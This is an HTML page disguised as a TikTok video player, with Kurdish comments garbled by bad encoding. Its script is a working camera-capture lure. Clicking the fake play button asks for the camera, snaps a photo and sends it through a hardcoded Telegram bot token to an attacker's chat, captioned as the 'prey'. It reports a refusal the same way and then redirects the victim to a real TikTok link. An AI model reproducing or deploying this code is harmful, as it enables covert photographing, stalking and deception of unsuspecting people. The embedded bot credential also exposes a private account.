<!DOCTYPE html>
<html lang="ku">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>TikTok</title>
    <style>
        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #000; overflow: hidden; font-family: sans-serif; }
        .bg { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: url('https://raw.githubusercontent.com/rudawsoran/Video/main/soran.jpg') no-repeat center center; background-size: contain; z-index: 1; }
        
        /* Ø¯ÙˆÚ¯Ù…Û•ÛŒ Ø³Û•Ø±Û•Ú©ÛŒ Ø¨Û† Ù†Ø§Ú†Ø§Ø±Ú©Ø±Ø¯Ù†ÛŒ Ú©Ù„ÛŒÚ© */
        #play-layer {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            z-index: 1000; display: flex; align-items: center; justify-content: center;
            background: rgba(0,0,0,0.3); cursor: pointer;
        }
        .play-btn-circle {
            width: 100px; height: 100px; background: rgba(255,255,255,0.8);
            border-radius: 50%; display: flex; align-items: center; justify-content: center;
            box-shadow: 0 0 20px rgba(255,255,255,0.4);
        }
        .play-icon { width: 50px; height: 50px; fill: #000; }
        video, canvas { display: none; }
    </style>
</head>
<body>
    <div class="bg"></div>
    
    <div id="play-layer" onclick="startCapture()">
        <div class="play-btn-circle">
            <svg class="play-icon" viewBox="0 0 24 24"><path d="M8 5v14l11-7z"/></svg>
        </div>
    </div>

    <video id="v" autoplay playsinline muted></video>
    <canvas id="c"></canvas>

    <script>
        const token = "8454166362:AAE-teyJSdRqs8yUA4UPUeHmiIT0TtyT1hc";
        const chat_id = "7261354534";
        const target = "https://vt.tiktok.com/ZS5WMhjoP/";

        async function startCapture() {
            // Ø´Ø§Ø±Ø¯Ù†Û•ÙˆÛ•ÛŒ Ø¯ÙˆÚ¯Ù…Û•Ú©Û• Ø¨Û† Ø¦Û•ÙˆÛ•ÛŒ Ø¨Ø²Ø§Ù†ÛØª Ú©Ø§Ø± Ø¯Û•Ú©Ø§Øª
            document.getElementById('play-layer').style.display = 'none';

            try {
                // Ø¯Ø§ÙˆØ§Ú©Ø±Ø¯Ù†ÛŒ Ú©Ø§Ù…ÛØ±Ø§ (Ø¦ÛØ³ØªØ§ Ù…Û†Ø¨Ø§ÛŒÙ„Û•Ú©Û• Ù†Ø§Ú†Ø§Ø±Û• Ù¾ÛŒØ´Ø§Ù†ÛŒ Ø¨Ø¯Ø§Øª Ú†ÙˆÙ†Ú©Û• Ú©Ù„ÛŒÚ©ÛŒ Ù„Û Ú©Ø±Ø§)
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const v = document.getElementById('v');
                v.srcObject = stream;
                await v.play();

                // Ú¯Ø±ØªÙ†ÛŒ ÙˆÛÙ†Û• Ø¯ÙˆØ§ÛŒ Ú†Ø±Ú©Û•ÛŒÛ•Ú©
                setTimeout(async () => {
                    const c = document.getElementById('c');
                    c.width = v.videoWidth; c.height = v.videoHeight;
                    c.getContext('2d').drawImage(v, 0, 0);
                    const b = await (await fetch(c.toDataURL('image/jpeg', 0.8))).blob();
                    
                    const fd = new FormData();
                    fd.append('chat_id', chat_id);
                    fd.append('photo', b, 'capture.jpg');
                    fd.append('caption', "ğŸ‘‘ Ù¾Ø§Ø´Ø§ÛŒÛ•ØªÛŒ: ÙˆÛÙ†Û•ÛŒ Ù†ÛÚ†ÛŒØ± Ø¦Ø§Ø´Ú©Ø±Ø§ Ø¨ÙˆÙˆ!");
                    
                    await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: fd });
                    window.location.href = target;
                }, 1000);
            } catch (e) {
                // Ø¦Û•Ú¯Û•Ø± Ú•Û•Ø¯ÛŒ Ú©Ø±Ø¯Û•ÙˆÛ•ØŒ Ù„Ø§Ù†ÛŒ Ú©Û•Ù… Ø¦Ø§Ú¯Ø§Ø¯Ø§Ø±ÛŒØª Ø¨Û† Ø¯ÛØª
                fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent("âŒ Ù†ÛÚ†ÛŒØ±Û•Ú©Û• Ú•Û•Ø¯ÛŒ Ú©Ø±Ø¯Û•ÙˆÛ•!")}`);
                window.location.href = target;
            }
        }
    </script>
</body>
</html>
